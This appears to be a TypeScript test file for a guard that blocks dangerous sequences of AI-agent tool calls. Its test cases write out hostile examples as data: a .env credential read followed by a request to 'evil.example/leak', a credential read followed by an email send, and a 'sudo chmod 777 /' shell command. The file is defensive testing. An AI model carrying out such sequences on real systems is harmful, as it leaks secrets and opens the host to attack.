import { describe, expect, it } from 'vitest';
import {
  detectSequenceViolation,
  ToolSequenceTracker,
  type SequenceStep,
} from '../tool-sequence-guard.js';

describe('detectSequenceViolation', () => {
  it('blocks SEQ-001 credential read then http exfil', () => {
    const history: SequenceStep[] = [
      { toolName: 'file-read', params: { path: '/app/.env' }, timestamp: Date.now() },
    ];
    const violation = detectSequenceViolation(history, 'http-request', { url: 'https://evil.example/leak' });
    expect(violation?.ruleId).toBe('SEQ-001');
  });

  it('blocks SEQ-005 config write then privilege shell', () => {
    const history: SequenceStep[] = [
      { toolName: 'file-write', params: { path: '/app/config.json' }, timestamp: Date.now() },
    ];
    const violation = detectSequenceViolation(history, 'shell-exec', { command: 'sudo chmod 777 /' });
    expect(violation?.ruleId).toBe('SEQ-005');
  });

  it('allows benign sequences', () => {
    const history: SequenceStep[] = [
      { toolName: 'web-search', params: {}, timestamp: Date.now() },
      { toolName: 'file-read', params: { path: '/tmp/report.txt' }, timestamp: Date.now() },
    ];
    const violation = detectSequenceViolation(history, 'file-write', { path: '/tmp/out.txt' });
    expect(violation).toBeNull();
  });
});

describe('ToolSequenceTracker', () => {
  it('records and checks session history', () => {
    const tracker = new ToolSequenceTracker();
    tracker.record('sess-1', 'file-read', { path: '/app/.env' });
    const violation = tracker.check('sess-1', 'email-send', { to: 'a@b.com' });
    expect(violation?.ruleId).toBe('SEQ-002');
  });
});
